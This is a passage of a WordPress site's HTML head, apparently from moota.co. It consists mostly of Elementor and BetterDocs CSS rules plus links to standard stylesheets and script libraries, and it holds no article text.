.elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-dffa300{text-align:left;}.elementor-725 .elementor-element.elementor-element-c74cba3 > .elementor-widget-container{margin:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-f897c30{width:100%;}.elementor-725 .elementor-element.elementor-element-f897c30 > .elementor-element-populated{margin:30px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;}.elementor-725 .elementor-element.elementor-element-f897c30 > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-d0d9f46{text-align:left;}.elementor-725 .elementor-element.elementor-element-63695d7a{padding:30px 20px 20px 20px;}.elementor-725 .elementor-element.elementor-element-6bfa31cf > .elementor-element-populated{margin:0px 0px 0px 0px;--e-column-margin-right:0px;--e-column-margin-left:0px;}.elementor-725 .elementor-element.elementor-element-6bfa31cf > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-725 .elementor-element.elementor-element-3d465ff1{text-align:center;}}@media(min-width:768px){.elementor-725 .elementor-element.elementor-element-55c8c034{width:50%;}.elementor-725 .elementor-element.elementor-element-0d88e30{width:17.157%;}.elementor-725 .elementor-element.elementor-element-f0c0a15{width:18.039%;}.elementor-725 .elementor-element.elementor-element-f897c30{width:14.804%;}}@media(max-width:1024px) and (min-width:768px){.elementor-725 .elementor-element.elementor-element-55c8c034{width:35%;}.elementor-725 .elementor-element.elementor-element-0d88e30{width:20%;}.elementor-725 .elementor-element.elementor-element-f0c0a15{width:20%;}.elementor-725 .elementor-element.elementor-element-f897c30{width:20%;}}
.elementor-2177 .elementor-element.elementor-element-29d2275 > .elementor-container{max-width:1200px;min-height:650px;}.elementor-2177 .elementor-element.elementor-element-29d2275 > .elementor-background-overlay{background-image:url("https://moota.co/wp-content/uploads/2019/08/404.png");background-position:center center;background-repeat:no-repeat;background-size:cover;opacity:1;transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-2177 .elementor-element.elementor-element-29d2275{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;padding:80px 0px 0px 0px;}.elementor-2177 .elementor-element.elementor-element-54280255 > .elementor-element-populated{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;}.elementor-2177 .elementor-element.elementor-element-54280255 > .elementor-element-populated > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-2177 .elementor-element.elementor-element-54280255 > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-2177 .elementor-element.elementor-element-734a4f8b{width:auto;max-width:auto;top:71px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-734a4f8b{left:292px;}body.rtl .elementor-2177 .elementor-element.elementor-element-734a4f8b{right:292px;}.elementor-2177 .elementor-element.elementor-element-2b527945{width:auto;max-width:auto;top:4px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-2b527945{left:844px;}body.rtl .elementor-2177 .elementor-element.elementor-element-2b527945{right:844px;}.elementor-2177 .elementor-element.elementor-element-239af307{width:auto;max-width:auto;top:39px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-239af307{left:222px;}body.rtl .elementor-2177 .elementor-element.elementor-element-239af307{right:222px;}.elementor-2177 .elementor-element.elementor-element-deccd8f > .elementor-container{max-width:380px;min-height:700px;}.elementor-2177 .elementor-element.elementor-element-deccd8f > .elementor-container > .elementor-row > .elementor-column > .elementor-column-wrap > .elementor-widget-wrap{align-content:center;align-items:center;}.elementor-2177 .elementor-element.elementor-element-deccd8f:not(.elementor-motion-effects-element-type-background), .elementor-2177 .elementor-element.elementor-element-deccd8f > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-image:url("https://moota.co/wp-content/uploads/2019/08/Shape.png");background-position:center center;background-repeat:no-repeat;}.elementor-2177 .elementor-element.elementor-element-deccd8f{transition:background 0.3s, border 0.3s, border-radius 0.3s, box-shadow 0.3s;margin-top:0px;margin-bottom:0px;}.elementor-2177 .elementor-element.elementor-element-deccd8f > .elementor-background-overlay{transition:background 0.3s, border-radius 0.3s, opacity 0.3s;}.elementor-2177 .elementor-element.elementor-element-213445bc > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 35px;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb{text-align:center;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb .elementor-heading-title{color:#ffffff;font-family:"Varela Round", Roboto, Sans-serif;font-size:80px;font-weight:300;text-transform:capitalize;line-height:1.2em;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb > .elementor-widget-container{margin:0px 0px -15px 0px;}.elementor-2177 .elementor-element.elementor-element-3f7b7423{text-align:center;}.elementor-2177 .elementor-element.elementor-element-3f7b7423 .elementor-heading-title{color:#ffffff;font-family:"Montserrat", Roboto, Sans-serif;font-size:30px;font-weight:300;text-transform:capitalize;line-height:1.2em;}.elementor-2177 .elementor-element.elementor-element-6ff6efff .elementor-button .elementor-align-icon-right{margin-left:10px;}.elementor-2177 .elementor-element.elementor-element-6ff6efff .elementor-button .elementor-align-icon-left{margin-right:10px;}.elementor-2177 .elementor-element.elementor-element-6ff6efff .elementor-button{font-family:"Montserrat", Roboto, Sans-serif;font-size:15px;font-weight:500;text-transform:capitalize;fill:#ffffff;color:#ffffff;background-color:#00dafc;border-radius:30px 30px 30px 30px;box-shadow:0px 0px 30px 0px rgba(0,0,0,0.1);}.elementor-2177 .elementor-element.elementor-element-6ff6efff .elementor-button:hover, .elementor-2177 .elementor-element.elementor-element-6ff6efff .elementor-button:focus{background-color:#4632da;}@media(max-width:1024px){body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-734a4f8b{left:77px;}body.rtl .elementor-2177 .elementor-element.elementor-element-734a4f8b{right:77px;}.elementor-2177 .elementor-element.elementor-element-734a4f8b{top:72px;}.elementor-2177 .elementor-element.elementor-element-2b527945{width:140px;max-width:140px;top:6px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-2b527945{left:622px;}body.rtl .elementor-2177 .elementor-element.elementor-element-2b527945{right:622px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-239af307{left:19px;}body.rtl .elementor-2177 .elementor-element.elementor-element-239af307{right:19px;}.elementor-2177 .elementor-element.elementor-element-239af307{top:32px;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb .elementor-heading-title{font-size:70px;}.elementor-2177 .elementor-element.elementor-element-3f7b7423 .elementor-heading-title{font-size:28px;}}@media(max-width:767px){.elementor-2177 .elementor-element.elementor-element-29d2275{padding:0px 0px 0px 0px;}.elementor-2177 .elementor-element.elementor-element-734a4f8b{width:130px;max-width:130px;top:17px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-734a4f8b{left:8px;}body.rtl .elementor-2177 .elementor-element.elementor-element-734a4f8b{right:8px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-2b527945{left:223px;}body.rtl .elementor-2177 .elementor-element.elementor-element-2b527945{right:223px;}.elementor-2177 .elementor-element.elementor-element-2b527945{top:-34px;}.elementor-2177 .elementor-element.elementor-element-239af307{width:80px;max-width:80px;top:-30px;}body:not(.rtl) .elementor-2177 .elementor-element.elementor-element-239af307{left:0px;}body.rtl .elementor-2177 .elementor-element.elementor-element-239af307{right:0px;}.elementor-2177 .elementor-element.elementor-element-deccd8f > .elementor-container{min-height:500px;}.elementor-2177 .elementor-element.elementor-element-deccd8f:not(.elementor-motion-effects-element-type-background), .elementor-2177 .elementor-element.elementor-element-deccd8f > .elementor-motion-effects-container > .elementor-motion-effects-layer{background-size:525px auto;}.elementor-2177 .elementor-element.elementor-element-213445bc > .elementor-element-populated > .elementor-widget-wrap{padding:0px 0px 0px 0px;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb{text-align:center;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb .elementor-heading-title{font-size:50px;}.elementor-2177 .elementor-element.elementor-element-4f3eebeb > .elementor-widget-container{padding:35px 0px 0px 0px;}.elementor-2177 .elementor-element.elementor-element-3f7b7423{text-align:center;}.elementor-2177 .elementor-element.elementor-element-3f7b7423 .elementor-heading-title{font-size:22px;}.elementor-2177 .elementor-element.elementor-element-6ff6efff .elementor-button{font-size:15px;padding:10px 15px 10px 15px;}}
</style>
<link rel='stylesheet' id='elementor-pro-css'  href='https://moota.co/wp-content/plugins/elementor-pro/assets/css/frontend.min.css?ver=3.7.2' media='all' />
<link rel='stylesheet' id='font-awesome-5-all-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.6.7' media='all' />
<link rel='stylesheet' id='font-awesome-4-shim-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.6.7' media='all' />
<style id='rocket-lazyload-inline-css'>
.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%;}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;cursor:pointer;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:72px;width:72px;left:50%;top:50%;margin-left:-36px;margin-top:-36px;position:absolute;background:url(https://moota.co/wp-content/plugins/rocket-lazy-load/assets/img/youtube.png) no-repeat;cursor:pointer}
</style>
<link rel='stylesheet' id='google-fonts-1-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CVarela+Round%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=auto&#038;ver=6.0.2' media='all' />
<link rel='stylesheet' id='elementor-icons-shared-0-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-solid-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-brands-css'  href='https://moota.co/wp-content/plugins/elementor/assets/lib/font-awesome/css/brands.min.css?ver=5.15.3' media='all' />
<script src='https://moota.co/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script src='https://moota.co/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script src='https://moota.co/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.6.7' id='font-awesome-4-shim-js'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://moota.co/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://moota.co/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 6.0.2" />
	<style>
		.betterdocs-wraper.betterdocs-main-wraper {
						background-color: #ffffff;
																				}
		.betterdocs-archive-wrap.betterdocs-archive-main {
			padding-top: 50px;
			padding-bottom: 50px;
			padding-left: 0px;
			padding-right: 0px;
		}
		.betterdocs-archive-wrap.betterdocs-archive-main {
			width: 100%;
			max-width: 1077px;
		}
		.betterdocs-categories-wrap.single-kb.layout-masonry .docs-single-cat-wrap {
			margin-bottom: 23px;
		}
		.betterdocs-categories-wrap.single-kb.layout-flex .docs-single-cat-wrap {
			margin: 23px; 
		}
		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap .docs-cat-title-wrap { 
			padding-top: 20px; 
		}

		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap .docs-cat-title-wrap, 
		.betterdocs-archive-main .docs-item-container { 
			padding-right: 20px;
			padding-left: 20px;  
		}
		.betterdocs-archive-main .docs-item-container { 
			padding-bottom: 20px; 
		}
		.betterdocs-categories-wrap.betterdocs-category-box.layout-2.single-kb .docs-single-cat-wrap,
		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap.docs-cat-list-2-box {
			padding-top: 20px; 
			padding-right: 20px;
			padding-left: 20px; 
			padding-bottom: 20px; 
		}
        		.betterdocs-categories-wrap.betterdocs-category-box .docs-single-cat-wrap p{
						color: #566e8b;
					}
		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap,
		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap .docs-cat-title-wrap {
						border-top-left-radius: 5px;
									border-top-right-radius: 5px;
					}
		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap,
		.betterdocs-categories-wrap.single-kb .docs-single-cat-wrap .docs-item-container {
						border-bottom-right-radius: 5px;
									border-bottom-left-radius: 5px;
					}
		.betterdocs-category-list .betterdocs-categories-wrap .docs-single-cat-wrap,
		.betterdocs-category-box.white-bg .docs-single-cat-wrap,
		.betterdocs-categories-wrap.white-bg .docs-single-cat-wrap {
						background-color: #fff;
					}
		.betterdocs-category-box.single-kb.ash-bg .docs-single-cat-wrap {
						background-color: #f8f8fc;
					}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap:hover,
		.betterdocs-categories-wrap.single-kb.white-bg .docs-single-cat-wrap.docs-cat-list-2-box:hover {
						background-color: #ffffff;
					}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap img {
						margin-bottom: 20px;
					}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap .docs-cat-title,
		.pro-layout-4.single-kb .docs-cat-list-2-box-content .docs-cat-title {
						margin-bottom: 15px;
					}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap p {
						margin-bottom: 15px;
					}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap span {
					}
		.docs-cat-title img {
			height: 32px; 
		}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap img { 
			height: 39px; 
		}
		.single-kb .docs-cat-title-inner .docs-cat-heading,
		.betterdocs-category-box.single-kb .docs-single-cat-wrap .docs-cat-title,
		.single-kb .docs-cat-list-2-box .docs-cat-title,
		.single-kb .docs-cat-list-2-items .docs-cat-title {
			font-size: 23px;
		}
        .single-kb .docs-cat-title-inner .docs-cat-heading {
			color: #528ffe; 
		}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap .docs-cat-title,
		.single-kb .docs-cat-list-2 .docs-cat-title {
			color: #11193c;
		}
				.docs-cat-title-wrap .docs-cat-title-inner {
			border-color: #528ffe; 
			padding-bottom: 20px;
		}
		.docs-cat-title-inner .docs-item-count span {
			color: #ffffff; 
			font-size: 16px;
		}
		.betterdocs-category-box.single-kb .docs-single-cat-wrap span,
		.single-kb .docs-cat-list-2-box .title-count span {
			color: #707070; 
			font-size: 16px;
		}
		.betterdocs-categories-wrap.single-kb .docs-cat-title-wrap .docs-item-count span {
			font-size: 16px;
			color: #ffffff; 
		}
		.betterdocs-categories-wrap .docs-item-count {
			background-color: #528ffe; 
		}

		.betterdocs-categories-wrap.single-kb .docs-cat-title-inner span {
			background-color: rgba(82,143,254,0.44);
			border-color: #ffffff;
			border-style: none;
			width: 21px; 
			height: 21px;
			border-top-width: 10px;
			border-right-width: 10px;
			border-bottom-width: 10px;
			border-left-width: 10px;
		}
		.betterdocs-categories-wrap.single-kb .docs-item-container ul {
			background-color: rgba(255,255,255,0);
			padding-top: 0px;
			padding-bottom: 0px;
			padding-right: 0px;
			padding-left: 0px;
		}
		.betterdocs-categories-wrap.single-kb .docs-item-container {
			background-color: #ffffff;
		}
		.betterdocs-categories-wrap.single-kb .docs-item-container li,
		.betterdocs-categories-wrap.single-kb .docs-item-container .docs-sub-cat-title,
        .betterdocs-popular-list.single-kb ul li {
			margin-top: 10px;
			margin-right: 10px;
			margin-left: 10px;
		}
        .betterdocs-categories-wrap.single-kb .docs-item-container li,
        .betterdocs-popular-list.single-kb ul li {
            margin-bottom: 10px;
			padding-top: 0px;
			padding-right: 0px;
			padding-bottom: 0px;
			padding-left: 0px;
        }
		.betterdocs-categories-wrap.single-kb .docs-item-container li svg {
			fill: #566e8b;
			font-size: 15px;
            min-width: 15px;
		}
        .betterdocs-popular-list.single-kb ul li svg {
			font-size: 15px;
            min-width: 15px;
		}
        .betterdocs-popular-list.single-kb ul li svg path {
			fill: #566e8b;
		}
		.betterdocs-categories-wrap.single-kb li a,
        .betterdocs-popular-list.single-kb ul li a {
			color: #566e8b;
			font-size: 15px;
		}
				.betterdocs-categories-wrap.single-kb .docs-item-container .docs-sub-cat li a {
			color: #566e8b;
		}
						.betterdocs-categories-wrap.single-kb .docs-item-container .docs-sub-cat li a:hover {
			color: #566e8b;
		}
						.betterdocs-categories-wrap.single-kb .docs-item-container .docs-sub-cat li svg {
			fill: #566e8b;
		}
				.betterdocs-categories-wrap.single-kb li a:hover,
        .betterdocs-popular-list.single-kb ul li a:hover {
			color: #566e8b;
		}
		.betterdocs-categories-wrap.single-kb .docs-item-container .docs-sub-cat-title svg {
			fill: #566e8b;
			font-size: 15px;
		}
		.betterdocs-categories-wrap.single-kb .docs-sub-cat-title a {
			color: #566e8b;
			font-size: 17px;
		}
		.betterdocs-categories-wrap.single-kb .docs-sub-cat-title a:hover {
			color: #566e8b;
		}
		.docs-item-container .docs-cat-link-btn, .docs-item-container .docs-cat-link-btn:visited {
			background-color: #ffffff;
			font-size: 16px;
			color: #528ffe;
			border-color: #528ffe;
			border-top-left-radius: 50px;
			border-top-right-radius: 50px;
			border-bottom-right-radius: 50px;
			border-bottom-left-radius: 50px;
			padding-top: 10px;
			padding-right: 20px;
			padding-bottom: 10px;
			padding-left: 20px;
			border-width: 1px;
		}

		.docs-item-container .docs-cat-link-btn{
			border-width: 1px;
		}
		.docs-item-container .docs-cat-link-btn:hover {
			background-color: #528ffe;
			color: #fff;
			border-color: #528ffe;
		}
		.docs-single-cat-wrap .docs-item-container .docs-cat-link-btn {
			margin-top: 10px;
			margin-bottom: 10px;
			margin-left: 20px;
			margin-right: 20px;
		}
		.betterdocs-single-bg .betterdocs-content-area, .betterdocs-single-bg .betterdocs-content-full {
			background-color: #ffffff;	
				
														}
		.betterdocs-single-wraper .betterdocs-content-area {
			padding-top: 30px;
			padding-right: 25px;
			padding-bottom: 30px;
			padding-left: 25px;
		}
		.betterdocs-single-wraper .betterdocs-content-area .docs-single-main {
			padding-top: 20px;
			padding-right: 20px;
			padding-bottom: 20px;
			padding-left: 20px;
		}
		.betterdocs-single-layout4 .betterdocs-content-full {
			padding-top: 30px;
			padding-right: 25px;
			padding-bottom: 30px;
			padding-left: 25px;
		}
		.betterdocs-single-layout4 .betterdocs-content-full{
			background-color: #ffffff;	
				
														}
		.betterdocs-single-layout5 .betterdocs-content-full {
			padding-top: 30px;
			padding-right: 25px;
			padding-bottom: 30px;
			padding-left: 25px;
		}
		.betterdocs-single-layout5 .betterdocs-content-full {
			background-color: #ffffff;	
				
														}
		.betterdocs-single-layout2 .docs-content-full-main .doc-single-content-wrapper {
			padding-top: 0px;
			padding-right: 0px;
			padding-bottom: 0px;
			padding-left: 0px;
		}
		.betterdocs-single-layout3 .docs-content-full-main .doc-single-content-wrapper {
			padding-top: 0px;
			padding-right: 0px;
			padding-bottom: 0px;
			padding-left: 0px;
		}
		.docs-single-title .betterdocs-entry-title {
			font-size: 32px;
			color: #000000;
		}
		.betterdocs-breadcrumb .betterdocs-breadcrumb-item a {
			font-size: 13px;
			color: #000000;
		}
		.betterdocs-breadcrumb .betterdocs-breadcrumb-list .betterdocs-breadcrumb-item a:hover {
			color: #566e8b;
		}
		.betterdocs-breadcrumb .breadcrumb-delimiter {
			color: #000000;
		}
		.betterdocs-breadcrumb-item.current span {
			font-size: 13px;
			color: #11193c;
		}
		.betterdocs-toc {
			background-color: #f9f9f9;
			padding-top: 20px;
			padding-right: 25px;
			padding-bottom: 20px;
			padding-left: 20px;
			margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 0px;
			margin-left: 0px;
		}
		.betterdocs-entry-content .betterdocs-toc {
			margin-bottom: 20px;
		}
		.sticky-toc-container {
			width: 298px;
		}
		.sticky-toc-container.toc-sticky {
			z-index: 2;
			margin-top: 0px;
		}
		.betterdocs-toc > .toc-title {
			color: #3f5876;
			font-size: 18px;
		}
		.betterdocs-entry-content .betterdocs-toc.collapsible-sm .angle-icon {
			color: #3f5876;
		}
		.betterdocs-toc > .toc-list a {
			color: #566e8b;
			font-size: 14px;
			margin-top: 5px;
			margin-right: 0px;
			margin-bottom: 5px;
			margin-left: 0px;
		}
		.betterdocs-toc > .toc-list li a:before {
			font-size: 12px;
			color: #566e8b;
		}
		.betterdocs-toc > .toc-list li:before {
			padding-top: 5px;
		}
		.betterdocs-toc > .toc-list a:hover {
			color: #4465f0;
		}
		.feedback-form-link .feedback-form-icon svg, .feedback-form-link .feedback-form-icon img {
			width: 26px;
		}
		.betterdocs-toc > .toc-list a.active,
        .betterdocs-toc > .toc-list a.active:before {
			color: #11193c;
		}
        .betterdocs-toc > .toc-list a.active:after {
            background-color: #11193c;
        }
		.betterdocs-content {
			color: #4d4d4d;
			font-size: 18px;
		}
		.betterdocs-social-share .betterdocs-social-share-heading h5 {
			color: #566e8b;
		}
		.betterdocs-entry-footer .feedback-form-link {
			color: #566e8b;
			font-size: 15px;
		}
		.betterdocs-entry-footer .feedback-update-form .feedback-form-link:hover {
			color: #566e8b;
		}
        .betterdocs-entry-footer .feedback-form .modal-content .feedback-form-title {
            color: #000000;
            font-size: 21px;
        }
		.docs-navigation a {
			color: #000000;
			font-size: 16px;
		}
		.docs-navigation a:hover {
			color: #3f5876;
		}
		.docs-navigation a svg{
			fill: #000000;
			min-width: 16px;
			width: 16px;
		}
		.betterdocs-entry-footer .update-date{
			color: #566e8b;
			font-size: 14px;
		}
		.betterdocs-credit p{
			color: #201d3a;
			font-size: 18px;
		}
		.betterdocs-credit p a{
			color: #4465f0;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap,
		.betterdocs-category-wraper .betterdocs-full-sidebar-left {
			background-color: #ffffff;
		}
		.betterdocs-single-layout1 .betterdocs-sidebar-content .betterdocs-categories-wrap {
														}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-single-cat-wrap .docs-cat-title-wrap {
			background-color: #f7f7f7;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-cat-title img {
			height: 16px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-cat-title-inner .docs-cat-heading{
			color: #000000;
			font-size: 14px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-cat-title-inner .docs-cat-heading:hover {
			color: #000000 !important;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-cat-title-inner .cat-list-arrow-down {
			color: #000000;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-single-cat-wrap .active-title .docs-cat-title-inner .docs-cat-heading,
		.betterdocs-sidebar-content.betterdocs-category-sidebar .active-title .docs-cat-title-inner .docs-cat-heading,
		.betterdocs-category-wraper .betterdocs-full-sidebar-left .docs-cat-title-wrap::after {
			color: #000000;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-item-count {
			background-color: #528ffe;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-item-count span {
			background-color: rgba(82,143,255,0.2);
			color: #ffffff;
			font-size: 12px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap .docs-single-cat-wrap {
			margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 0px;
			margin-left: 0px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap, .betterdocs-full-sidebar-left .betterdocs-categories-wrap {
			padding-top: 0px;
			padding-right: 0px;
			padding-bottom: 0px;
			padding-left: 0px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap .docs-single-cat-wrap .docs-cat-title-wrap {
			padding-top: 5px;
			padding-right: 5px;
			padding-bottom: 5px;
			padding-left: 5px;
		}
		.betterdocs-single-layout2 .betterdocs-full-sidebar-left .betterdocs-sidebar-content .betterdocs-categories-wrap .docs-cat-title-inner {
						background-color: #f7f7f7;
						padding-top: 5px;
			padding-right: 5px;
			padding-bottom: 5px;
			padding-left: 5px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-item-container{
			background-color: #f2f2f2;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .docs-single-cat-wrap .docs-cat-title-wrap.active-title{
			background-color: #e8e8e8;
			border-color: #1e73be;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap .docs-item-container li {
			padding-left: 0;
			margin-top: 0px;
			margin-right: 10px;
			margin-bottom: 5px;
			margin-left: 10px;
		}
		.betterdocs-single-layout2 .betterdocs-sidebar-content .betterdocs-categories-wrap .docs-item-container li {
			margin-right: 0 !important;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap li a {
			color: #11193c;
			font-size: 16px;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap li a:hover {
			color: #4465f0;
		}
		.betterdocs-sidebar-content.betterdocs-category-sidebar .betterdocs-categories-wrap li svg {
			fill: #4465f0;
			font-size: 14px;
		}
        .betterdocs-sidebar-content .betterdocs-categories-wrap li a.active,
        .betterdocs-sidebar-content .betterdocs-categories-wrap li.sub-list a.active {
            color: #4465f0;
        }
		.betterdocs-category-wraper.betterdocs-single-wraper{
																				}	
		.betterdocs-category-wraper.betterdocs-single-wraper .docs-listing-main .docs-category-listing{
						background-color: #ffffff;
						margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 0px;
			margin-left: 0px;
			padding-top: 30px;
			padding-right: 30px;
			padding-bottom: 30px;
			padding-left: 30px;
			border-radius: 5px;
		}
		.betterdocs-category-wraper .docs-category-listing .docs-cat-title .docs-cat-heading {
			color: #566e8b;
			font-size: 31px;
			margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 20px;
			margin-left: 0px;
		}
		.betterdocs-category-wraper .docs-category-listing .docs-cat-title p {
			color: #566e8b;
			font-size: 14px;
			margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 20px;
			margin-left: 0px;
		}
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list ul li, 
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat-title {
			margin-top: 10px;
			margin-right: 0px;
			margin-bottom: 10px;
			margin-left: 0px;
		}
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list ul li svg {
			fill: #566e8b;
			font-size: 16px;
            min-width: 16px;
		}
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list ul li a {
			color: #566e8b;
			font-size: 14px;
		}
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list ul li a:hover {
			color: #11193c;
		}
				.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat li a {
			color: #566e8b;
		}
						.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat li a:hover {
			color: #566e8b;
		}
						.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat li svg {
			fill: #566e8b;
		}
				.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat-title svg {
			fill: #566e8b;
			font-size: 15px;
		}
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat-title a {
			color: #566e8b;
			font-size: 17px;
		}
		.betterdocs-category-wraper .docs-listing-main .docs-category-listing .docs-list .docs-sub-cat-title a:hover {
			color: #566e8b;
		}

		.betterdocs-search-form-wrap{
						background-color: #4465f0;
																		padding-top: 50px;
			padding-right: 20px;
			padding-bottom: 50px;
			padding-left: 20px;
			margin-top:0px;
			margin-right:0px;
			margin-bottom:0px;
			margin-left:0px;
					}
		.betterdocs-search-heading h2.heading, .betterdocs-search-heading h1.heading, .betterdocs-search-heading h3.heading, .betterdocs-search-heading h4.heading, .betterdocs-search-heading h5.heading, .betterdocs-search-heading h6.heading {
			line-height: 1.2;
			font-size: 25px;
			color: #566e8b;
			margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 20px;
			margin-left: 0px;
		}
		.betterdocs-search-heading h3.subheading, .betterdocs-search-heading h2.subheading, .betterdocs-search-heading h1.subheading, .betterdocs-search-heading h4.subheading, .betterdocs-search-heading h5.subheading, .betterdocs-search-heading h6.subheading {
			line-height: 1.2;
			font-size: 16px;
			color: #566e8b;
			margin-top: 0px;
			margin-right: 0px;
			margin-bottom: 20px;
			margin-left: 0px;
		}
		.betterdocs-searchform {
			background-color: #ffffff;
			border-radius: 8px;
			padding-top: 22px;
			padding-right: 15px;
			padding-bottom: 22px;
			padding-left: 15px;
		}
		.betterdocs-searchform .betterdocs-search-field {
			font-size: 17px;
			color: #595959;
		}	
		.betterdocs-searchform .betterdocs-search-field:focus{
			color: #595959;
		}
		.betterdocs-searchform .betterdocs-search-field::placeholder{
			color: #595959;
